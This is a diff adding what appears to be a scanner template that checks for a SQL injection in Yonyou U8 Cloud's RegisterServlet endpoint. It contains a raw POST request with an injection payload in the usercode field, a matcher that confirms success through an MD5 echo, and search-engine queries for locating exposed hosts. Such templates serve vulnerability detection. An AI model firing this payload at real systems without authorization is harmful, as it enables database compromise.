@@ -1,0 +1,41 @@
+id: yonyou-u8-cloud-registerservlet-sqli
+
+info: 
+  name: 用友 u8-cloud RegisterServlet SQL注入漏洞
+  author: Y3y1ng
+  severity: critical
+  verified: true
+  description: |
+    用友 U8 Cloud产品RegisterServlet接口处存在SQL注入漏洞，攻击者可通过该漏洞获取数据库权限。
+    Fofa: title="u8c" || app="用友-U8-Cloud"
+    Hunter: title="u8c" || app.name="用友 U8 Cloud"
+    ZoomEye: app:"用友U8 Cloud"
+  reference:
+    - https://security.yonyou.com/#/noticeInfo?id=421
+    - https://mp.weixin.qq.com/s/K9zT2z5Vhyuw9c9gZhH2hw
+  tags: yonyou,u8,sqli
+  created: 2023/12/08
+
+set:
+  r1: randomInt(10000,99999)
+  hostname: request.url.host
+  
+rules:
+  r0:
+    request:
+      raw: |
+        POST /servlet/RegisterServlet HTTP/1.1
+        Host: {{hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
+        Connection: close
+        Content-Length: 85
+        Accept: */*
+        Accept-Language: en
+        Content-Type: application/x-www-form-urlencoded
+        X-Forwarded-For: 127.0.0.1
+        Accept-Encoding: gzip
+
+        usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','{{r1}}')),3,32)>0-- 
+    expression: | 
+      response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
+expression: r0() 
